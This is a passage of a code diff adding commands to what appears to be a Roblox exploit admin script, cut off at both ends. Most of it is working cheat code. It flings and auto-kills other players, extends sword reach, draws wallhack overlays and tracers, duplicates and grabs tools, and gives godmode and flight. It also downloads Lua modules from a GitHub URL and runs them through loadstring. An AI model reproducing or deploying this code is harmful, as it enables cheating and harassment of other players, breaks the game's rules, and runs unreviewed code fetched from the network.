+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		coroutine.wrap(function()
+			Loop = RunService.Heartbeat:Connect(function()
+				Utils.GetRoot(LocalPlayer.Character).CFrame = v.Character.Head.CFrame * CFrame.new(0, 1, 0);
+			end)
+		end)()
+		Tbl[v] = Loop
+	end
+end)
+
+AddCommand("unheadstand", {"noheadstand"}, "unheadstand {target}\nunheadstands on the target", function(Caller, Args)
+	local Looped = CommandStuff["Commands"]["headstand"]
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Looped do
+		for i2, v2 in next, Target do
+			if (i == v2) then
+				v:Disconnect();
+			end
+		end
+	end
+end)
+
+
+AddCommand("loopjump", {}, "loopjump\nloopjumps the character", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			getgenv().loopjump = true
+			coroutine.wrap(function()
+				repeat
+					v.Character:FindFirstChildOfClass("Humanoid").Jump = true
+					wait(.2);
+				until not CheckClaim(v) or not getgenv().loopjump
+			end)();
+			-- Tbl[v] = true
+		end
+	end
+end)
+
+AddCommand("unloopjump", {}, "unloopjump\nunloopjumps the character", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	-- local Looped = CommandStuff["Commands"]["loopjump"]
+	-- for i, v in next, Target do
+	-- 	for i2, v2 in next, Looped do
+	-- 		if i2 == v then
+	-- 			v2 = false
+	-- 		end
+	-- 	end
+	-- end
+	getgenv().loopjump = getgenv().loopjump and false
+end)
+
+AddCommand("toolfling", {"handlefling"}, "toolfling\nif you touch a player with this tool out they will get flinged", function(Caller, Args)
+	local Tool = LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildOfClass("Tool");
+	if (not Tool) then
+		return Utils.Notify(Caller or LocalPlayer, nil, "You need a tool for this command");
+	end
+	Tool.GripPos = Vector3.new(math.huge, math.huge, math.huge);
+
+	for i, v in next, GetPlayer(Args[1]) do
+		CheckCl = RunService.Stepped:Connect(function()
+			if (v.Character) then
+				if (isnetworkowner(Utils.GetRoot(v.Character))) then
+					Utils.Notify(Caller, "Claimed", "Claimed User");
+					Claimed = isnetworkowner(Utils.GetRoot(v.Character));
+					CheckCl:Disconnect();
+					F_A.execmd("loopbring", {Caller, "claimed"});
+				end
+			else
+				CheckCl:Disconnect();
+			end
+		end)
+	end
+end)
+
+AddCommand("fling", {}, "fling {target}\nflings the player", function(Caller, Args)
+	local targets = GetPlayer(Args[1]);
+    local char = LocalPlayer.Character
+    local hrp = Utils.GetRoot(char)
+    local old, oldv = hrp.CFrame, hrp.Velocity
+
+    for _,target in pairs(targets) do
+        local tchar = target.Character
+        local thrp = Utils.GetRoot(tchar)
+        local told = thrp.Position
+        local temp = game:GetService('RunService').Stepped:Connect(function(step)
+            step = step - workspace.DistributedGameTime
+        
+            hrp.CFrame = (thrp.CFrame - (Vector3.new(0, 1e6, 0) * step)) + (thrp.Velocity * (step * 30))
+            hrp.Velocity = Vector3.new(0, 1e6, 0)
+        end)
+        local start = tick()
+        repeat
+            wait()
+        until (told - thrp.Position).magnitude >= 60 or tick() - start >= 3.5
+        temp:Disconnect()
+    end
+    wait()
+    local temp = game:GetService('RunService').Stepped:Connect(function()
+        hrp.Velocity = oldv
+        hrp.CFrame = old
+    end)
+    wait(2)
+    hrp.Anchored = true
+    temp:Disconnect()
+    hrp.Anchored = false
+    hrp.Velocity = oldv
+    hrp.CFrame = old
+end)
+
+AddCommand("cfling", {}, "cfling {target}\nclaim version of fling", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		Instance.new("BodyVelocity", v.Character.Torso).Velocity = Vector3.new(100000000000, 10000000000, 1000000000);
+	end
+end)
+
+AddCommand("chatlogs", {"clogs"}, "chatlogs\nenables chat logs so you can see everyones chat", function(Caller, Args)
+	local OldVal = getgenv().ChatLogsEnabled
+	getgenv().ChatLogsEnabled = false
+
+	local MessageClone = ChatLogs.Frame.List:Clone()
+
+	Utils.ClearAllObjects(ChatLogs.Frame.List)
+	ChatLogs.Visible = true
+
+	local Tween = Utils.TweenAllTransToObject(ChatLogs, .25, ChatLogsTransparencyClone)
+
+	ChatLogs.Frame.List:Destroy()
+	MessageClone.Parent = ChatLogs.Frame
+
+	for _, v in ipairs(ChatLogs.Frame.List:GetChildren()) do
+		if (not v:IsA("UIListLayout")) then
+			Utils.Tween(v, "Sine", "Out", .25, {
+				TextTransparency = 0
+			})
+		end
+	end
+
+	local ChatLogsListLayout = ChatLogs.Frame.List.UIListLayout
+
+	ChatLogsListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+		ChatLogs.Frame.List.CanvasPosition = Vector2.new(0, ChatLogsListLayout.AbsoluteContentSize.Y);
+	end)
+
+    Utils.Tween(ChatLogs.Frame.List, "Sine", "Out", .25, {
+        ScrollBarImageTransparency = 0
+    })
+
+	getgenv().ChatLogsEnabled = OldVal
+end)
+
+AddCommand("globalchatlogs", {"gclogs"}, "chatlogs\nenables chat logs so you can see everyones chat", function(Caller, Args)
+	local OldVal = getgenv().AdminChatLogsEnabled
+	getgenv().AdminChatLogsEnabled = false
+
+	local MessageClone = AdminChatLogs.Frame.List:Clone()
+
+	Utils.ClearAllObjects(AdminChatLogs.Frame.List)
+	AdminChatLogs.Visible = true
+
+	local Tween = Utils.TweenAllTransToObject(AdminChatLogs, .25, AdminChatLogsTransparencyClone)
+
+	AdminChatLogs.Frame.List:Destroy()
+	MessageClone.Parent = AdminChatLogs.Frame
+
+	local AdminChatLogsListLayout = AdminChatLogs.Frame.List.UIListLayout
+	
+	AdminChatLogsListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+		AdminChatLogs.Frame.List.CanvasPosition = Vector2.new(0, AdminChatLogsListLayout.AbsoluteContentSize.Y);
+	end)
+
+	for _, v in ipairs(AdminChatLogs.Frame.List:GetChildren()) do
+		if (not v:IsA("UIListLayout")) then
+			Utils.Tween(v, "Sine", "Out", .25, {
+				TextTransparency = 0
+			})
+		end
+	end
+
+    Utils.Tween(AdminChatLogs.Frame.List, "Sine", "Out", .25, {
+        ScrollBarImageTransparency = 0
+    })
+
+	getgenv().AdminChatLogsEnabled = OldVal
+end)
+
+AddCommand("joinlogs", {"jlogs"}, "joinlogs\nenables join logs", function(Caller, Args, Tbl)
+	if (Tbl[1]) then
+		Tbl[1]:Disconnect();
+	end
+	log = Players.PlayerAdded:Connect(function(plr)
+		local time = os.date("%X");
+		Utils.Notify(Caller or LocalPlayer, "JoinLogs", ("%s - %s has joined the game."):format(time, plr.Name));
+	end)
+	Tbl[1] = log
+end)
+
+AddCommand("nojoinlogs", {"nojlogs"}, "nojoinlogs\nremoves join logs", function(Caller, Args)
+	CommandStuff["Commands"]["joinlogs"][1]:Disconnect();
+end)
+
+AddCommand("breaknet", {"nonet", "breaknetwork"}, "breaknet\nbreaks your network", function(Caller, Args)
+	NetworkSet:Disconnect();
+end)
+
+AddCommand("setnet", {"setnetwork"}, "setnet {number}\nsets your network to whatever", function(Caller, Args)
+	NetworkSet:Disconnect();
+	SetNetwork(LocalPlayer, tonumber(Args[1]));
+end)
+
+AddCommand("godmode", {}, "godmode\ngives you fencing godmode", function(Caller, Args)
+	getgenv().godmode = true
+	repeat
+		pcall(function()
+			firetouchinterest(Utils.GetRoot(LocalPlayer.Character), game.Workspace.Button, 0);
+			wait()
+			firetouchinterest(Utils.GetRoot(LocalPlayer.Character), game.Workspace.Button, 1);
+			wait()
+		end)
+	until not getgenv().godmode
+end)
+
+AddCommand("ungodmode", {}, "ungodmode\nstops your god mode", function(Caller, Args)
+	getgenv().godmode = false
+end)
+
+AddCommand("skill", {"swordkill"}, "skill {target}\nswordkills the user auto", function(Caller, Args)
+	local Target, Option, LoopOption = GetPlayer(Args[1]), Args[2] or "", Args[3] or ""    
+	local Backpack, Character = LocalPlayer.Backpack, LocalPlayer.Character
+	local Tool = Character:FindFirstChild("ClassicSword") or Backpack:FindFirstChild("ClassicSword") or Backpack:FindFirstChildOfClass("Tool") or Character:FindFirstChildOfClass("Tool")
+	Tool.Parent = Character
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character)
+	for i, v in next, Target do
+		coroutine.wrap(function()
+			if (v.Character:FindFirstChild("ForceField")) then
+				repeat wait() until not v.Character:FindFirstChild("ForceField");
+			end
+			for i = 1, 5 do
+				if (Option:lower() == "manual") then
+					Utils.GetRoot(Character).CFrame = Utils.GetRootCFrame(v.Character) * CFrame.new(0, -3, 0);
+					Tool:Activate();
+					Tool:Activate();
+					wait();
+				else
+					Tool:Activate();
+					firetouchinterest(Tool.Handle, Utils.GetRoot(v.Character), 0);
+					wait();
+					firetouchinterest(Tool.Handle, Utils.GetRoot(v.Character), 1);
+					wait();
+				end
+			end
+			wait();
+			if (Option:lower() == "manual") then
+				LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+			end
+		end)()
+	end
+end)
+
+AddCommand("reach", {"swordreach"}, "reach\nchanges handle size of your tool", function(Caller, Args)
+	local Amount = Args[1]
+	local Tool = LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool");
+	Tool.Handle.Size = Vector3.new(Tool.Handle.Size.X, Tool.Handle.Size.Y, tonumber(Amount or 30));
+end)
+
+AddCommand("clearblocks", {}, "clearblocks\nclears the unanchored in workspace", function(Caller, Args)
+	for i, v in next, game.Workspace:GetChildren() do
+		if (v:IsA("BasePart") and not v.Anchored and isnetworkowner(v)) then
+			v.CFrame = CFrame.new(0, -3e3, 0);
+		end
+	end
+end)
+
+AddCommand("clearhats", {}, "clearhats\nclears the unanchored hats in workspace", function(Caller, Args)
+	for i, v in next, Workspace:GetChildren() do
+		if (v:IsA("Accessory") and not v.Handle.Anchored and isnetworkowner(v.Handle)) then
+			v.Handle.CFrame = CFrame.new(0, -math.huge, 0);
+		end
+	end
+end)
+
+AddCommand("bringblocks", {}, "bringblocks\nbrings unanchored blocks to you", function(Caller, Args)
+	for i, v in next, game.Workspace:GetChildren() do
+		if v:IsA("BasePart") and not v.Anchored then
+			v.CFrame = Utils.GetRootCFrame(Caller.Character)
+		end
+	end
+end)
+
+AddCommand("tpblocks", {}, "tpblocks {target}\ntps blocks to a user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		for i2, v2 in next, game.Workspace:GetChildren() do
+			if v2:IsA("BasePart") and not v2.Anchored then
+				v2.CFrame = Utils.GetRootCFrame(v.Character)
+			end
+		end
+	end
+end)
+
+AddCommand("noarms", {}, "noarms\nremoves your arms", function(Caller, Args, Tbl)
+	LocalPlayer.Character["Left Arm"]:Destroy();
+	LocalPlayer.Character["Right Arm"]:Destroy();
+end)
+
+AddCommand("nolegs", {}, "nolegs\nremoves your legs", function(Caller, Args)
+	LocalPlayer.Character["Left Leg"]:Destroy();
+	LocalPlayer.Character["Right Leg"]:Destroy();
+end)
+
+AddCommand("anticlaim", {"antiattach"}, "anticlaim\nanti claim/attach", function(Caller, Args)
+	Workspace.FallenPartsDestroyHeight = -math.huge
+	Tools = {}
+	for i, v in pairs(LocalPlayer.Character:GetChildren(), LocalPlayer.Backpack:GetChildren()) do
+		if (v:IsA("Tool")) then
+			Tools[#Tools + 1] = v
+		end
+	end
+	LocalPlayer.Character.ChildAdded:Connect(function(x)
+		if not (table.find(Tools, x)) then
+			x:Destroy();
+		end
+	end)
+end)
+
+AddCommand("noclip", {}, "noclip\nnoclips your character", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1])
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			coroutine.wrap(function()
+				NoClipping = RunService.Stepped:Connect(function()
+					for i2, v2 in next, v.Character:GetChildren() do
+						if (v2:IsA("BasePart") and v2.CanCollide) then
+							v2.CanCollide = false
+						end
+					end
+				end)
+			end)()
+			Tbl[v] = NoClipping
+			LocalPlayer.Character.Humanoid.Died:Connect(function()
+				NoClipping:Disconnect();
+			end)
+			Utils.Notify(Caller or LocalPlayer, nil, "Noclip Enabled");
+		end
+	end
+end)
+
+AddCommand("clip", {"unnoclip"}, "clip\nremoves the noclip for your character", function(Caller, Args)
+	local looped = CommandStuff["Commands"]["noclip"]
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		for i2, v2 in next, looped do
+			if i2 == v then
+				v2:Disconnect();
+			end
+		end
+	end
+	Utils.Notify(Caller or LocalPlayer, nil, "Noclip Disabled");
+end)
+
+local esps = {}
+
+AddCommand("noesp", {}, "noesp", function(Caller,Args)
+	for i, v in next, esps do
+		if v:IsA("BillboardGui") then
+			v:Destroy();
+		end
+	end
+	local Added = CommandStuff["Commands"]["esp"]
+	for i, v in next, Added do
+		v:Disconnect();
+	end
+end)
+
+AddCommand("esp", {}, "esp\nlook where everyone is", function(Caller, Args, Tbl)
+	CreateESP = function(Player)
+		if Player and Player.Character and Player.Character:FindFirstChild("Head") then
+			local billboard = Instance.new('BillboardGui')
+			ParentGui(billboard)
+			esps[#esps + 1] = billboard
+			billboard.Name = HttpService:GenerateGUID();
+			billboard.AlwaysOnTop = true
+			billboard.Adornee = Player.Character.Head
+			billboard.Size = UDim2.new(0, 200, 0, 50)
+			billboard.StudsOffset = Vector3.new(0, 4, 0)
+			local textlabel = Instance.new('TextLabel', billboard);
+			textlabel.Name = HttpService:GenerateGUID();
+			textlabel.TextStrokeTransparency = 0.6
+			textlabel.BackgroundTransparency = 1
+			textlabel.TextColor3 = Color3.new(0, 255, 0)
+			textlabel.Size = UDim2.new(0, 200, 0, 50)
+			textlabel.TextScaled = false
+			textlabel.TextSize = 10
+			textlabel.Text = Player.Name
+			local Color = Instance.new('TextLabel', billboard);
+			Color.Name = HttpService:GenerateGUID();
+			Color.TextStrokeTransparency = 0.6;
+			Color.BackgroundTransparency = 1;
+			Color.TextColor3 = Color3.new(152, 152, 152)
+			Color.Size = UDim2.new(0, 200, 0, 50)
+			Color.TextScaled = false;
+			Color.TextSize = 8;
+			coroutine.wrap(function()
+				local Loop
+				Loop = RunService.Heartbeat:Connect(function()
+					pcall(function()
+						if Player then
+							local Humanoid = Player.Character and Player.Character.Humanoid
+							if Humanoid or HumanoidRootPart then
+								local Distance = math.floor((workspace.CurrentCamera.CFrame.p - Utils.GetRootCFrame(Player.Character).p).Magnitude)
+								Color.Text = '\n \n \n ['..tonumber(Distance)..']'
+								Color.Text = Color.Text .. '['.. math.floor(Humanoid.Health) ..'/'.. math.floor(Humanoid.MaxHealth) ..']'
+							else
+								billboard:Destroy()
+								Loop:Disconnect();
+							end
+						else
+							billboard:Destroy()
+							Loop:Disconnect();
+						end
+					end)
+				end)
+			end)();
+		end
+	end
+
+	for i, Player in next, Players:GetPlayers() do
+		CreateESP(Player);
+		CharAdded = Player.CharacterAdded:Connect(function()
+			Player.Character:WaitForChild("Head");
+			CreateESP(Player);
+		end)
+		Tbl[Player] = CharAdded
+	end
+
+	Added = Players.PlayerAdded:Connect(function(Player)
+		Player.CharacterAdded:Wait();
+		Player.Character:WaitForChild("Head");
+		CreateESP(Player);
+	end)
+	Tbl[Players] = Added
+end)
+-- import function
+pcall(function()
+	local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+	local CoreGui = game:GetService("CoreGui")
+	local HTTPService = game:GetService("HttpService")
+	local TestService = game:GetService("TestService")
+	
+	local function Import(Asset)
+		if (type(Asset) == "number") then
+			return game:GetObjects("rbxassetid://" .. Asset)[1]
+		else
+			local Link = string.format("https://raw.githubusercontent.com/misrepresenting/Infusa/main/Modules/%s", Asset)
+			local Response = game:HttpGetAsync(Link)
+	
+			local Function = loadstring(Response)
+			local Success, Return = pcall(Function)
+	
+			if (Success) then
+				return Return
+			else
+				TestService:Error("[Infusa] (" .. Asset .. ")\n" .. Return)
+			end
+		end
+	end
+	
+	local LocalPlayer = Players.LocalPlayer
+	local PlayerGui = LocalPlayer:FindFirstChildWhichIsA("PlayerGui")
+	local Camera = workspace.CurrentCamera
+	
+	ESPModule = Import("ESP.lua")
+	TracersModule = Import("Tracers.lua")
+	TracersUI = ParentGui(Instance.new("ScreenGui"))
+	EspUi = ParentGui(Instance.new("ScreenGui"))
+end)
+
+AddCommand("tracers", {}, "tracers\nloads tracers", function(Caller, Args)
+	if (TracersUI) then
+		TracersModule.Initiate(TracersUI);
+	else
+		TracersUI = ParentGui(Instance.new("ScreenGui"));
+		TracersModule.Initiate(TracersUI);
+	end
+end)
+
+AddCommand("chams", {}, "chams\nloads chams", function(Caller, Args)
+	if (EspUi) then
+		ESPModule.Initiate(EspUi);
+	else
+		EspUi = ParentGui(Instance.new("ScreenGui"));
+		ESPModule.Initiate(EspUi);
+	end
+end)
+
+AddCommand("notracers", {}, "notracers\nremoves tracers", function(Caller, Args)
+	if (TracersUI) then
+		TracersUI:Destroy();
+	end
+end)
+
+AddCommand("nochams", {}, "nochams\nremoves chams", function(Caller, Args)
+	if (EspUi) then
+		EspUi:Destroy();
+	end
+end)
+
+AddCommand("fov", {}, "fov {number}/default\nchanges your fieldofview", function(Caller, Args)
+	local Amount = tonumber(Args[1]) or 70
+	Workspace.CurrentCamera.FieldOfView = tostring(Args[1]:lower()) == "default" and 70 or Amount
+end)
+
+AddCommand("fireclickdetectors", {}, "fireclickdetectors\nfires all the click detectors", function(Caller, Args)
+	local amount = 0
+	local howmany = Args[1]
+	for i, v in next, Workspace:GetDescendants() do
+		if (v:IsA("ClickDetector")) then
+			fireclickdetector(v);
+			amount = amount + 1
+			if (howmany and amount == tonumber(howmany)) then break; end
+		end
+	end
+	Utils.Notify(Caller or LocalPlayer, nil, ("fired %d amount of clickdetectors"):format(amount));
+end)
+
+AddCommand("firetouchinterests", {}, "firetouchinterests\ntouches all touch transmitters", function(Caller, Args)
+	local amount = 0
+	local howmany = Args[1]
+	for i, v in next, Workspace:GetDescendants() do
+		if (v:IsA("TouchTransmitter")) then
+			firetouchinterest(Utils.GetRoot(LocalPlayer.Character), v.Parent, 0);
+			wait();
+			firetouchinterest(Utils.GetRoot(LocalPlayer.Character), v.Parent, 1);
+			amount = amount + 1
+			if (howmany and amount == tonumber(howmany)) then break; end
+		end
+	end
+	Utils.Notify(Caller or LocalPlayer, nil, ("fired %d amount of touchtransmitters"):format(amount));
+end)
+
+
+AddCommand("firecommandonspawn", {"firecmdspawn"}, "firecommandonspawn\nfires a command when you spawn", function(Caller, Args, Tbl)
+	OnSpawn = LocalPlayer.CharacterAdded:Connect(function()
+		LocalPlayer.CharacterAppearanceLoaded:Wait();
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+		F_A.execmd(Args[1], Caller, table.pack(table.unpack(Args, 2, #Args)));
+	end)
+	Tbl[#Tbl + 1] = OnSpawn
+	Utils.Notify(Caller or LocalPlayer, nil, ("\"%s\" will be executed on spawn with args \"{%s}\""):format(Args[1]:lower(), table.concat(table.pack(table.unpack(Args, 2, #Args)), ",")));
+end)
+
+AddCommand("breakonspawn", {}, "breakonspawn\nstops the commands being fired on spawn", function(Caller, Args, Tbl)
+	for i, v in next, CommandStuff["Commands"]["firecommandonspawn"] do
+		v = v and v:Disconnect();
+	end
+end)
+
+AddCommand("firecmds", {"execmds"}, "firecmds\nfires commands \",\" between each command", function(Caller, Args)
+	local Commands = (table.concat(Args, " ")):split(",");
+	local executed = {}
+	for i, v in next, Commands do
+		local args = v:split(" ");
+		local Command = args[1]
+		F_A.execmd(Command, Caller, table.pack(table.unpack(args, 2, #args)));
+		executed[#executed + 1] = Command
+	end
+
+	Utils.Notify(Caller or LocalPlayer, nil, ("fired cmds: %s"):format(table.concat(executed, ", ")));
+end)
+
+AddCommand("nosales", {}, "nosales\nno purchase prompt notifications will be shown", function(Caller, Args)
+	CoreGui.PurchasePromptApp.PurchasePromptUI.Visible = false
+	Utils.Notify(Caller or LocalPlayer, nil, "You'll no longer recive sale prompts");
+end)
+
+AddCommand("respawn", {}, "respawn\nrespawns your character", function(Caller, Args)
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character)
+	respawn = LocalPlayer.CharacterAdded:Connect(function()
+		wait();
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+		respawn:Disconnect();
+	end)
+	LocalPlayer.Character:BreakJoints();
+end)
+
+AddCommand("dupetools", {"dp"}, "dupetools {number}\ndupes your tools (fencing only)", function(Caller, Args)
+	local Amount = Args[1] and tonumber(Args[1]) or #game:GetService("Players"):GetChildren();
+	local toolamount = Amount or #game:GetService("Players"):GetChildren();
+	if (game.PlaceId == (12109643) or Workspace:FindFirstChildWhichIsA("TouchTransmitter", true).Parent.Name == "Handle") then
+		return (function()
+			if (not LocalPlayer.Character or LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and LocalPlayer.Character.Humanoid.Health <= 0) then
+				LocalPlayer.CharacterAdded:Wait();
+				LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+			end
+			local spray = game:GetService("Workspace").Handle
+			local old = Utils.GetRootCFrame(LocalPlayer.Character)
+			Utils.GetRoot(LocalPlayer.Character).CFrame = utils.GetRootCFrame(LocalPlayer.Character) * CFrame.new(0, -300, 0);
+			Utils.GetRoot(LocalPlayer.Character).Anchored = true
+			local tools = {}
+			for i = 1, toolamount do
+				pcall(function()
+					firetouchinterest(Utils.GetRoot(Players.LocalPlayer.Character), spray, 0);
+					wait();
+					firetouchinterest(Utils.GetRoot(Players.LocalPlayer.Character), spray, 1);
+					wait();
+					local tool = Players.LocalPlayer.Character:FindFirstChild("Spray");
+					repeat
+						tool.Parent = Workspace
+						RunService.Heartbeat:Wait();
+					until (tool.Parent ~= Character or tool.Parent ~= LocalPlayer.Backpack)
+					tool.Handle.CFrame = Utils.GetRootCFrame(LocalPlayer.Character) * CFrame.new(math.random(-500, 500), 0, math.random(-5, 10));
+					tools[#tools + 1] = tool
+					tool.Handle.Anchored = true
+					RunService.Heartbeat:Wait();
+				end)
+			end
+			for i, v in next, tools do
+				coroutine.wrap(function()
+					repeat
+						firetouchinterest(v.Handle, LocalPlayer.Character:WaitForChild("HumanoidRootPart"), 0);
+						v.Handle.Anchored = false
+						wait()
+					until not v.Parent or v.Parent == LocalPlayer.Character or not v.Parent == workspace
+					firetouchinterest(v.Handle, Utils.GetRoot(LocalPlayer.Character), 1);
+					v.Handle.Anchored = false
+				end)()
+			end
+			Utils.GetRoot(LocalPlayer.Character).Anchored = false
+			Utils.GetRoot(LocalPlayer.Character).CFrame = old
+		end)()
+	end
+
+	local LocalPlayer = game.Players.LocalPlayer
+	local tools = {}
+	local oldpos = Utils.GetRootCFrame(LocalPlayer.Character)
+	for i = 1, toolamount do
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = Utils.GetRootCFrame(LocalPlayer.Character) * CFrame.new(0, -100, 0)
+		Utils.GetRoot(LocalPlayer.Character).Anchored = true
+		LocalPlayer.Character.Humanoid:UnequipTools();
+		wait();
+		for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
+			if v:IsA("Tool") and v:FindFirstChild("Handle") then
+				v.Parent = LocalPlayer.Character
+				v.Parent = Workspace
+				v.Handle.CFrame = Utils.GetRootCFrame(LocalPlayer.Character) * CFrame.new(0, 4, 10)
+				v.Handle.Anchored = true
+				tools[#tools + 1] = v
+			end
+		end
+		LocalPlayer.Character:BreakJoints();
+		LocalPlayer.CharacterAppearanceLoaded:Wait();
+		wait(.1);
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+	end
+	for i, v in next, tools do
+		coroutine.wrap(function()
+			firetouchinterest(v.Handle, Utils.GetRoot(LocalPlayer.Character), 0);
+			firetouchinterest(v.Handle, Utils.GetRoot(LocalPlayer.Character), 1);
+			v.Handle.Anchored = false
+		end)()
+	end
+end)
+
+AddCommand("grabtools", {}, "grabtools\ngrabs tools if it's in the workspace", function(Caller, Args)
+	local Children = Workspace:GetChildren();
+	local amount = 0
+	for i, v in next, Children do
+		if (v:IsA("Tool") and v:FindFirstChild("Handle")) then
+			firetouchinterest(v.Handle, Utils.GetRoot(LocalPlayer.Character), 0);
+			wait();
+			firetouchinterest(v.Handle, Utils.GetRoot(LocalPlayer.Character), 1);
+			amount = amount + 1
+		end
+	end
+	Utils.Notify(Caller, nil, ("grabbed %s amount of tools."):format(amount));
+end)
+
+AddCommand("loopgrabtools", {"lgrabtools"}, "loopgrabtools\ngrabs all tools when as soon they are dropped in workspace", function(Caller, Args, Tbl)
+	F_A.execmd("grabtools", Caller, {});
+	Loop = Workspace.ChildAdded:Connect(function(v)
+		if (v:IsA("Tool") and v:FindFirstChild("Handle")) then
+			firetouchinterest(v.Handle, Utils.GetRoot(LocalPlayer.Character), 0);
+			wait();
+			firetouchinterest(v.Handle, Utils.GetRoot(LocalPlayer.Character), 1);
+		end
+	end)
+	Tbl[#Tbl + 1] = Loop
+end)
+
+AddCommand("unloopgrabtools", {"unlgrabtools"}, "unloopgrabtools\nunloops grabbing tools in the workspace", function(Caller, Args)
+	local Looped = CommandStuff["Commands"]["loopgrabtools"]
+	for i, v in next, Looped do
+		v:Disconnect();
+	end
+end)
+
+AddCommand("fly", {}, "fly\nflies your character", function(Caller, Args, Tbl)
+	mouse = game.Players.LocalPlayer:GetMouse()
+	localplayer = game.Players.LocalPlayer
+	local hrp = localplayer.Character:WaitForChild("HumanoidRootPart")
+	flying = true
+	flyspeed = 0.3
+	local keys = {
+		a = false,
+		d = false,
+		w = false,
+		s = false
+	} 
+	local function start()
+		local pos = Instance.new("BodyPosition", hrp)
+		local gyro = Instance.new("BodyGyro", hrp)
+		pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+		pos.position = hrp.Position
+		gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+		gyro.cframe = hrp.CFrame
+		repeat
+			wait();
+			localplayer.Character.Humanoid.PlatformStand = true
+			local new = gyro.cframe - gyro.cframe.p + pos.position
+			if not keys.w and not keys.s and not keys.a and not keys.d then
+				speed = 1
+			end
+			if (keys.w or keys.s) then 
+				new = keys.w and (new+Workspace.CurrentCamera.CoordinateFrame.lookVector*speed) or (new-Workspace.CurrentCamera.CoordinateFrame.lookVector*speed) 
+				speed = speed + (0.01 * (flyspeed or 0.3))
+			end
+			if (keys.d or keys.a) then 
+				new = new * CFrame.new(keys.d and speed or -speed,0,0)
+				speed = speed + (0.01 * (flyspeed or 0.3))
+			end
+			if (speed > 5 * flyspeed or 0.3) then
+				speed = 5 * (flyspeed or 0.3)
+			end
+			pos.position = new.p
+			if (keys.w or keys.s) then
+				gyro.cframe = Workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*15),0,0)
+			else
+				gyro.cframe = Workspace.CurrentCamera.CoordinateFrame
+			end
+		until not flying
+		
+		if gyro then gyro:Destroy() end
+		if pos then pos:Destroy() end
+		flying = false
+		localplayer.Character.Humanoid.PlatformStand = false
+		speed = 0
+	end
+	e1 = mouse.KeyDown:connect(function(key)
+		if not hrp or not hrp.Parent then flying=false e1:disconnect() e2:disconnect() return end
+		if key=="w" then
+			keys.w=true
+		elseif key=="s" then
+			keys.s=true
+		elseif key=="a" then
+			keys.a=true
+		elseif key=="d" then
+			keys.d=true
+		end
+	end)
+	e2 = mouse.KeyUp:connect(function(key)
+		if key=="w" then
+			keys.w=false
+		elseif key=="s" then
+			keys.s=false
+		elseif key=="a" then
+			keys.a=false
+		elseif key=="d" then
+			keys.d=false
+		end
+	end)
+	Tbl[#Tbl + 1] = flying	 
+	start();
+end)
+
+AddCommand("unfly", {}, "unfly\nunflies your character", function(Caller, Args)
+	flying = false
+end)
+
+AddCommand("flyspeed", {}, "flyspeed {number}\nchanges your fly speed", function(Caller, Args)
+	flyspeed = tonumber(Args[1]);
+end)
+
+AddCommand("whitelist", {"allowaccess"}, "whitelist {target}\nallows the user to have access to the script", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		table.insert(AdminUse, v);
+		Utils.Notify(Caller or LocalPlayer, "Whitelisted", v.Name.." is whitelisted");
+		Utils.Notify(v, "Whitelisted", v.Name.." is whitelisted");
+	end
+end)
+
+AddCommand("blacklist", {"denyaccess"}, "blacklist {target}\nblacklists the user from using commands", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		for i2, v2 in next, AdminUse do
+			if v2 == v then
+				table.remove(AdminUse, i2);
+				Utils.Notify(Caller or LocalPlayer, "Blacklisted", v.Name.." is blacklisted");
+			end
+		end
+	end
+end)
+
+AddCommand("addalias", {}, "addalias {command} {alias}\n\nadds an alias to a command", function(Caller, Args)
+	local Command = Args[1]
+	local AliasToAdd = Args[2]
+	for i, v in next, Functions do
+		if (v.Name == Command) then
+			v.Aliases[#v.Aliases + 1] = AliasToAdd
+			local json = HttpService:JSONDecode(readfile("fates admin settings.json"));
+			json.Aliases = json.Aliases or {}
+			json.Aliases[v.Name] = json.Aliases[v.Name] or {}
+			json.Aliases[v.Name][#json.Aliases[v.Name] + 1] = AliasToAdd
+			writefile("fates admin settings.json", HttpService:JSONEncode(json));
+			return Utils.Notify(Caller or LocalPlayer, nil, ("added the alias %s to %s"):format(tostring(AliasToAdd), v.Name));
+		end
+	end
+	Utils.Notify(Caller or LocalPlayer, nil, "no command found")
+end)
+
+AddCommand("removealias", {}, "removealias {alias}\nremoves an alias to a command", function(Caller, Args)
+	local Alias = Args[1]
+	for i, v in next, Functions do
+		for i2, v2 in next, v.Aliases do
+			if (Alias == v2) then
+				table.remove(v.Aliases, i2);
+				local json = HttpService:JSONDecode(readfile("fates admin settings.json"));
+				json.Aliases = json.Aliases or {}
+				json.Aliases[v.Name] = json.Aliases[v.Name] or {}
